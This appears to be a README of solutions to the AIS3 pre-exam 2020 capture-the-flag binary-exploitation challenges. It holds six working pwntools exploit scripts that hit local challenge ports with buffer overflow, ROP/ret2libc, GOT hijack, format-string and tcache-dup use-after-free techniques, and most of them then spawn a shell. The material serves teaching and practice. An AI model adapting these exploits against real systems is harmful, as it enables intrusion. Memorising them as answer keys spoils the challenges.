# AIS3 pre-exam 2020

## Setup

```
docker-compose up --build -d
```

## Challenge

### 👻 BOF

> buffer overflow

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./bof")

context.arch = "amd64"

ret = 0x400699
shell = 0x400687

r.sendlineafter(".", 'a' * 0x38 + flat(ret, shell))

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 📃 Nonsense

> alphanumeric shellcode, out of bounds

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10001

r = remote(ip, port)
# r = process("./nonsense")

context.arch = "amd64"

# https://hama.hatenadiary.jp/entry/2017/04/04/190129
payload = "RRYh00AAX1A0hA004X1A4hA00AX1A8QX4tPj0X40PZPjAX4znoNDnRYZnCXA"
nonsense = "wubbalubbadubdub"

name = "haha"
payload += nonsense

r.sendafter("?", name)
r.sendafter("?", payload)
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🔫 Portal gun

> return oriented programming, ret2libc

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10002

r = remote(ip, port)
# r = process("./portal_gun", env = {"LD_PRELOAD": "./hook.so"})
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

main = 0x4006fb
puts_plt = 0x400560
puts_got = 0x601018
pop_rdi = 0x4007a3

payload = 'a' * 120 + flat(pop_rdi, puts_got, puts_plt, main)

r.sendlineafter("?", payload)
r.recvline()
libc_base = u64(r.recvline()[:6].ljust(8, '\x00')) - libc.sym.puts

info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c
payload = 'a' * 120 + flat(magic)
r.sendlineafter("?", payload)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🏫 Morty school

> out of bounds, GOT hijack

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10003

r = remote(ip, port)
# r = process("./morty_school")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

r.recvuntil(": ")
libc_base = int(r.recvline()[:-1], 16) - libc.sym.puts
info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c

# (0x4005c0 - 0x6020a0) / 0x18
r.sendlineafter("teach?", str(-87668))
r.sendafter(":", p64(magic))
r.sendafter(":", "\x00" * 0x100)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🔮 Death crystal

> format string

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10004

r = remote(ip, port)
# r = process("./death_crystal")

context.arch = "amd64"

payload = "%d" * 11 + ".%llu"
r.sendlineafter(":", payload)

r.recvline()
code_base = int(r.recvline().split(".")[1]) - 0xb20
info("code base: {}".format(hex(code_base)))

flag = code_base + 0x202060
payload = flat("%d" * 8, ".%s.aaaa", p64(flag))
r.sendlineafter(":", payload)

r.interactive()
```

</details>

### 📦 Meeseeks box

> use after free, tcache dup

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10005

r = remote(ip, port)
# r = process("./meeseeks_box")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

def Create(sz, data):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", str(sz))
    r.sendlineafter(":", data)

def Show(idx):
    r.sendlineafter(">", "2")
    r.sendlineafter(":", str(idx))

def Delete(idx):
    r.sendlineafter(">", "3")
    r.sendlineafter(":", str(idx))

# unsorted bin
Create(0x900, 'aaaa')
Create(0x20, 'bbbb')
Delete(0)
Show(0)

libc_base = u64(r.recvline()[1:7].ljust(8, '\x00')) - 0x3ebca0
libc.address = libc_base
info("libc base: {}".format(hex(libc_base)))
magic = libc_base + 0x10a38c

# tcache dup
Create(0x20, 'cccc')
Delete(2)
Delete(2)
Create(0x20, p64(libc.sym.__malloc_hook))
Create(0x20, 'dddd')
Create(0x20, p64(magic))

# trigger __malloc_hook and pop the shell
r.sendlineafter(">", "1")
r.sendlineafter(":", "hack")
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>
